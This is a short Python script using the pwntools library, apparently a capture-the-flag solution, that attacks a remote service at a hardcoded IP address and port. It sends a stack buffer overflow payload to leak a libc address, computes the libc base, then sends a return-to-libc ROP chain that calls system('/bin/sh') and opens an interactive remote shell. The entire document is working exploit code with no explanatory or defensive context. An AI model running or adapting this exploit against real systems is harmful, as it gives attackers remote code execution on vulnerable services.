from pwn import *

libc = ELF("./libc-2.23.so")
context.log_level = "debug"
context.arch = 'amd64'

host, port = "34.159.129.6", 30550

io = remote(host, port)
payload = b"a"*0x58 + p64(0x400713) + p64(0x4006b7)*2
io.sendafter(b"friend?\n", payload)

data = io.recvline()[:-1]
leaks = []
for i in range(0, len(data) - 8, 8):
    leaks.append(u64(data[i:i+8]))

libc.address = leaks[2] - libc.symbols['_IO_2_1_stdout_']

log.info("libc @ "+hex(libc.address))

system = libc.symbols['system']
pop_rdi = libc.address + 0x21112
binsh = next(libc.search(b'/bin/sh'))

payload = b"a"*0x58 + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendafter(b"friend?\n", payload)

io.interactive()